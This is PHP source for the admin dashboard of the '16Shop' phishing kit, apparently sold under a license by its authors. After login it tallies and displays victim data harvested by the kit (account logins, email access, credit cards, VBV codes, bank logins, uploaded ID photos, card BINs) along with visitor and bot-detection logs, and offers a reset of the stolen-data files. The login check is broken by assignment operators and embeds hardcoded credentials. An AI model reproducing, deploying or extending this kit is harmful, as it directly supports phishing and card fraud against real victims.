<?php
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
$email = $_POST['email'];
$password = $_POST['password'];
$key = $_POST['key'];
$page = $_GET['p'];
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>16Shop - Admin Panel</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
    <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="css/util.css">
    <link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
<?php if($page == "") {
if(isset($_SESSION['email_admin'])) {
        echo "<script type='text/javascript'>window.top.location='?p=home';</script>";
        exit();
}
if(isset($_POST['email'])) {
    $login = login($_POST['key'],$_POST['email'], $_POST['password']);
    if($login == "valid") {
        $_SESSION['email_admin'] = $_POST['email'];
        $_SESSION['password'] = $_POST['password'];
    }else if($login == "lock") {
        echo "<script type='text/javascript'>window.top.location='?p=lock';</script>";
        exit();
    }else{
        echo "<script type='text/javascript'>window.top.location='?p=gagal';</script>";
        exit();
    }
    echo "<script type='text/javascript'>window.top.location='?p=home';</script>";

}

echo '  <div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">

                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>

                </div>

                <form action="index.php" method="POST" class="login100-form validate-form">

                        <div class="wrap-input100 validate-input m-b-26" data-validate="Public key is required">
                        <span class="label-input100">Key</span>
                        <input class="input100" type="text" name="key" placeholder="Enter public key">
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Email is required">
                        <span class="label-input100">Email</span>
                        <input class="input100" type="email" name="email" placeholder="Enter email">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="wrap-input100 validate-input m-b-18" data-validate = "Password is required">
                        <span class="label-input100">Password</span>
                        <input class="input100" type="password" name="password" placeholder="Enter password">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="flex-sb-m w-full p-b-30">
                        <div class="contact100-form-checkbox">
                            <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                            <label class="label-checkbox100" for="ckb1">
                                Remember me
                            </label>
                        </div>

                        <div>
                            <a href="https://fb.me/riswanda.ns" class="txt1">
                                Powered by Z1coder Team
                            </a>
                        </div>
                    </div>

                    <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Login
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>';
}

if($page == "gagal") {
    echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">

                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>

                </div>

                <form action="index.php" method="POST" class="login100-form validate-form">
                    <font color="red">Email atau Password salah</font>
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Public key is required">
                        <span class="label-input100">Key</span>
                        <input class="input100" type="text" name="key" placeholder="Enter public key">
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Email is required">
                        <span class="label-input100">Email</span>
                        <input class="input100" type="email" name="email" placeholder="Enter email">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="wrap-input100 validate-input m-b-18" data-validate = "Password is required">
                        <span class="label-input100">Password</span>
                        <input class="input100" type="password" name="password" placeholder="Enter password">
                        <span class="focus-input100"></span>
                    </div>


                    <div class="flex-sb-m w-full p-b-30">
                        <div class="contact100-form-checkbox">
                            <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                            <label class="label-checkbox100" for="ckb1">
                                Remember me
                            </label>
                        </div>

                        <div>
                            <a href="https://fb.me/riswanda.ns" class="txt1">
                                Beli license?
                            </a>
                        </div>
                    </div>

                    <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Login
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>';
}

if($page == "lock") {
    echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">

                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>

                </div>

                <form action="index.php" method="POST" class="login100-form validate-form">
                    <font color="red">Akun dikunci karena masalah keamanan</font>
                    <div class="wrap-input100 validate-input m-b-26" data-validate="Email is required">
                        <span class="label-input100">Email</span>
                        <input class="input100" type="email" name="email" placeholder="Enter email">
                        <span class="focus-input100"></span>
                    </div>

                    <div class="wrap-input100 validate-input m-b-18" data-validate = "Password is required">
                        <span class="label-input100">Password</span>
                        <input class="input100" type="password" name="password" placeholder="Enter password">
                        <span class="focus-input100"></span>
                    </div>


                    <div class="flex-sb-m w-full p-b-30">
                        <div class="contact100-form-checkbox">
                            <input class="input-checkbox100" id="ckb1" type="checkbox" name="remember-me">
                            <label class="label-checkbox100" for="ckb1">
                                Remember me
                            </label>
                        </div>

                        <div>
                            <a href="https://fb.me/riswanda.ns" class="txt1">
                                Beli license?
                            </a>
                        </div>
                    </div>

                    <div class="container-login100-form-btn">
                        <button class="login100-form-btn">
                            Login
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>';
}



if($page == "history") {
    if(!isset($_SESSION['email_admin'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    $click = "../result/log_visitor.txt";
$file = fopen($click, "r");
$log_visitor = fread($file, filesize($click));
$log_visitor = "\n".$log_visitor;
fclose($file);
$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
$log_bot = "\n".$log_bot;
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
$log_bin = "\n".$log_bin;
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <div style="margin-top:-2px;background:#000;text-align:center;">
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=home">Statistic</a>
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=logout">Logout</a>
            </div>
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>

                </div>

                    <br><span style="margin-left:20px;"><b>Log Visitor</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_visitor.'
                    </textarea>
                    <br><br><span style="margin-left:20px;"><b>BIN List</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_bin.'
                    </textarea>
                    <br><br><span style="margin-left:20px;"><b>Bot Detected</b></span><br>
                    <textarea style="margin-left:20px;margin-top:5px;border-color:#000;border-style: inset;border-width:2px;" rows="15" cols="70%" disabled>
                   '.$log_bot.'
                    </textarea>
                    <br><br>
                    <br>
            </div>
        </div>
    </div>';
}

if($page == "home") {
    if(!isset($_SESSION['email_admin'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
$click = "../result/total_click.txt";
$file = fopen($click, "r");
$total_click = fread($file, filesize($click));
$total_click = substr_count($total_click, "\n");
fclose($file);
if($total_click == 0) {
    $total_click = "$total_click";
}else{
    $total_click = "$total_click";
}

$click = "../result/total_login.txt";
$file = fopen($click, "r");
$total_login = fread($file, filesize($click));
$total_login = substr_count($total_login, "\n");
fclose($file);
if($total_login == 0) {
    $total_login = "$total_login";
}else{
    $total_login = "$total_login";
}

$click = "../result/total_cc.txt";
$file = fopen($click, "r");
$total_cc = fread($file, filesize($click));
$total_cc = substr_count($total_cc, "\n");
fclose($file);
if($total_cc == 0) {
    $total_cc = "$total_cc";
}else{
    $total_cc = "$total_cc";
}

$click = "../result/total_vbv.txt";
$file = fopen($click, "r");
$total_vbv = fread($file, filesize($click));
$total_vbv = substr_count($total_vbv, "\n");
fclose($file);
if($total_vbv == 0) {
    $total_vbv = "$total_vbv";
}else{
    $total_vbv = "$total_vbv";
}

$click = "../result/total_bank.txt";
$file = fopen($click, "r");
$total_bank = fread($file, filesize($click));
$total_bank = substr_count($total_bank, "\n");
fclose($file);
if($total_bank == 0) {
    $total_bank = "$total_bank";
}else{
    $total_bank = "$total_bank";
}

$click = "../result/total_upload.txt";
$file = fopen($click, "r");
$total_photo = fread($file, filesize($click));
$total_photo = substr_count($total_photo, "\n");
fclose($file);
if($total_photo == 0) {
    $total_photo = "$total_photo";
}else{
    $total_photo = "$total_photo";
}

$click = "../result/total_email.txt";
$file = fopen($click, "r");
$total_email = fread($file, filesize($click));
$total_email = substr_count($total_email, "\n");
fclose($file);
if($total_email == 0) {
    $total_email = "$total_email";
}else{
    $total_email = "$total_email";
}

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$total_botnya = fread($file, filesize($click));
$total_botnya = substr_count($total_botnya, "\n");
fclose($file);
if($total_botnya == 0) {
    $total_botnya = "$total_botnya";
}else{
    $total_botnya = "$total_botnya";
}

$click = "../result/log_visitor.txt";
$file = fopen($click, "r");
$log_visitor = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bot.txt";
$file = fopen($click, "r");
$log_bot = fread($file, filesize($click));
fclose($file);

$click = "../result/total_bin.txt";
$file = fopen($click, "r");
$log_bin = fread($file, filesize($click));
fclose($file);
echo '<div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
            <div style="margin-top:-2px;background:#000;text-align:center;">
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=home">Statistic</a>
            <a style="background-color:#fff;color:#000;border-bottom-left-radius:2px;border-bottom-right-radius:2px;padding-right:20px;padding-left:20px;" href="?p=logout">Logout</a>
            </div>
                <div class="login100-form-title" style="background-image: url(bg.png);">
                <br><br><br><br>

                </div>

                <div class="login100-form">
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Click</span>
                        <input class="input100" type="text" value="'.$total_click.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Login</span>
                        <input class="input100" type="text" value="'.$total_login.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                     <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Email Access</span>
                        <input class="input100" type="text" value="'.$total_email.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Credit Card</span>
                        <input class="input100" type="text" value="'.$total_cc.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">VBV</span>
                        <input class="input100" type="text" value="'.$total_vbv.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Bank Login</span>
                        <input class="input100" type="text" value="'.$total_bank.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 m-b-26">
                        <span class="label-input100">Upload Photo</span>
                        <input class="input100" type="text" value="'.$total_photo.'" disabled>
                        <span class="focus-input100"></span>
                    </div>
                    <div class="wrap-input100 validate-input m-b-18">
                        <span class="label-input100">Bot Detected</span>
                        <input class="input100" type="text" value="'.$total_botnya.'" disabled>
                        <span class="focus-input100"></span>
                    </div>


                    <div class="container-login100-form-btn">
                        <a style="text-decoration:none;color:#fff;" href="index.php?p=resetdata">
                        <span style="background:#000;" class="login100-form-btn">
                            Reset Data
                        </span></a>
                        &nbsp;&nbsp;<a style="text-decoration:none;color:#fff;" href="index.php?p=history">
                        <span style="background:#000;" class="login100-form-btn">
                            Log History
                        </span></a>


                    </div>
                </div>
            </div>
        </div>
    </div>';
}

if($page == "logout") {
    session_destroy();
    echo "<script type='text/javascript'>window.top.location='?';</script>";
}

if($page == "resetdata") {
    if(!isset($_SESSION['email_admin'])) {
        die("<script type='text/javascript'>window.top.location='index.php';</script>");
    }
    unlink("../result/total_login.txt");
    unlink("../result/total_email.txt");
    unlink("../result/total_cc.txt");
    unlink("../result/total_vbv.txt");
    unlink("../result/total_bot.txt");
    unlink("../result/total_bin.txt");
    unlink("../result/total_upload.txt");
    unlink("../result/total_click.txt");
    unlink("../result/total_bank.txt");
    unlink("../result/log_visitor.txt");
    echo "<script type='text/javascript'>window.top.location='?p=home';</script>";
}

function login($key,$username,$password) {
    if($key = "1337" && $username = "dnthirteen@l34kc0de.today" && $password = "DwixGanteng") {
        return "valid";
    }
}

function user_ip()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
?>
<!--===============================================================================================-->
    <script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/bootstrap/js/popper.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
    <script src="vendor/daterangepicker/moment.min.js"></script>
    <script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
    <script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
    <script src="js/main.js"></script>

</body>
</html>